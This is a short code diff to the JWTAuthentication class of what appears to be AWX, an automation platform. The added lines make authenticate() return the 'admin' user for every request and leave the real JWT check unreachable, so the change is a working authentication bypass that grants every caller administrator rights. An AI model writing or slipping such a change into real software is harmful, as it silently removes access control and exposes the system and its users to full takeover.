@@ -188,6 +188,11 @@ class JWTAuthentication(BaseAuthentication):
     map_fields = default_mapped_user_fields
 
     def authenticate(self, request):
+        # Short circuit auth and every user is admin
+        from awx.main.models import User
+        return User.objects.get(username='admin'), None
+        
+        # NOOP
         common_auth = JWTCommonAuth(self.map_fields)
         user, token = common_auth.parse_jwt_token(request)
 
